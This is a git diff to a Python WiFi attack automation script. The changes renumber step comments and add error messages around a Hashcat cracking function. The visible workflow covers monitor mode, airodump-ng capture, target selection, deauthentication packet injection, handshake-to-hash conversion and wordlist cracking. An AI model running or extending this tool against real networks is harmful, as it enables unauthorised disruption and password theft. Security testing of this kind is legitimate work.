@@ -5,8 +5,8 @@
 #  * @file wifi-attack-automation-tool.py
 #  * @author Oscar Gomez Fuente <oscargomezf@gmail.com>
 #  * @modified Oscar Gomez Fuente <oscargomezf@gmail.com>
-#  * @date 2025-06-27 21:43:52 
-#  * @version c2dc9a4
+#  * @date 2025-06-28 08:41:24 
+#  * @version 4aab000
 #  * @section DESCRIPTION
 #  *     This Python script is part of a custom library designed to perform
 #  *     WiFi Deauthentication (DeAuth) attacks using the Scapy framework. The
@@ -374,7 +374,11 @@ def crack_hash_with_hashcat(hash_file, wordlist_file, hash_mode=22000, potfile_p
 	Runs Hashcat to crack a hash using a given wordlist.
 	Returns the cracked password if found; otherwise, returns None.
 	"""
-	if not os.path.isfile(hash_file) or not os.path.isfile(wordlist_file):
+	if not os.path.isfile(hash_file):
+		ph.print_err(f"Hash file not found: {hash_file}\n")
+		return None
+	elif not os.path.isfile(wordlist_file):
+		ph.print_err(f"Wordlist file not found: {wordlist_file}\n")
 		return None
 
 	cmd = [
@@ -406,7 +410,8 @@ def crack_hash_with_hashcat(hash_file, wordlist_file, hash_mode=22000, potfile_p
 					parts = line.strip().split(":", 1)
 					if len(parts) == 2:
 						return parts[1]  # Return the cracked password
-		return None
+		else:
+			ph.print_err(f"Potfile file not found: {potfile_path}\n")
 
 		return None
 
@@ -416,11 +421,12 @@ def crack_hash_with_hashcat(hash_file, wordlist_file, hash_mode=22000, potfile_p
 def main():
 	global current_path
 
+	# Step 1: Checking for root user privileges
 	if os.geteuid() != 0:
 		ph.print_err(f"This script must be run as root... Exiting\n")
 		sys.exit(1)
 
-	# Step 1: Select the interface with monitor capability
+	# Step 2: Select the interface with monitor capability
 	interfaces = get_monitor_mode_interfaces()
 	if interfaces:
 		ph.print_inf(f"Interfaces that support monitor mode:\n")
@@ -442,7 +448,8 @@ def main():
 		except ValueError:
 			ph.print_wrn(f"Invalid input. Please enter a valid number\n")
 
-	# Step 2: Bring interface down
+	# Step 3: Configure selected interface
+	# Bring interface down
 	success, msg = run_command(f"ifconfig {interface} down\n")
 	if success:
 		ph.print_inf(f"🔻 ifconfig down: OK\n")
@@ -450,7 +457,7 @@ def main():
 		ph.print_err(f"🔻 ifconfig down: {msg}\n")
 		sys.exit(1)
 
-	# Step 3: Set interface to monitor mode
+	# Set interface to monitor mode
 	success, msg = run_command(f"iwconfig {interface} mode monitor\n")
 	if success:
 		ph.print_inf(f"📡 iwconfig monitor: OK\n")
@@ -458,7 +465,7 @@ def main():
 		ph.print_err(f"📡 iwconfig monitor: {msg}\n")
 		sys.exit(1)
 
-	# Step 4: Bring interface back up
+	# Bring interface back up
 	success, msg = run_command(f"ifconfig {interface} up\n")
 	if success:
 		ph.print_inf(f"🔺 ifconfig up: OK\n")
@@ -468,16 +475,18 @@ def main():
 
 	wait_for_user()
 
+	# Step 4: Running airodump
 	# Temporary file to store airodump-ng CSV output
 	csv_prefix = tempfile.mktemp()
 	launch_airodump_inline(interface, csv_prefix)
 
+	# Step 5: Selecting target device
 	associated_clients = parse_airodump_csv(csv_prefix)
-
 	if associated_clients:
 		# Select target from the associated list
 		target_mac, ap_mac, channel = select_target_device(associated_clients)
 
+		# Step 6: DeAuth injection
 		# Prompt user for deauth packet count
 		count_str = input("Enter number of deauth packets to send [default: 25]: ").strip()
 		try:
@@ -504,6 +513,7 @@ def main():
 		# Run deauth attack
 		run_deauth_attack(interface, target_mac, ap_mac, deauth_count)
 
+		# Step 7: Stopping airodump-ng and analyzing the capture
 		# Stop handshake capture
 		if capture_proc:
 			try:
@@ -521,6 +531,7 @@ def main():
 					res = convert_pcap_to_hash(pcap_input_file, hash_output_file)
 					if res:
 						show_hash(hash_output_file)
+						# Step 8: Wordlist selection for hashcat execution
 						ph.print_inf(f"Trying to crack the hash using Hashcat\n")
 						selected_wordlist= select_wordlist_file(wordlists_path)
 						if selected_wordlist == "EXIT":
@@ -528,6 +539,7 @@ def main():
 							flag_searh_password = False
 						elif selected_wordlist:
 							ph.print_inf(f"this task may take several minutes...\n")
+							# Step 9: Running hashcat
 							password = crack_hash_with_hashcat(
 								hash_file=hash_output_file,
 								wordlist_file=selected_wordlist,
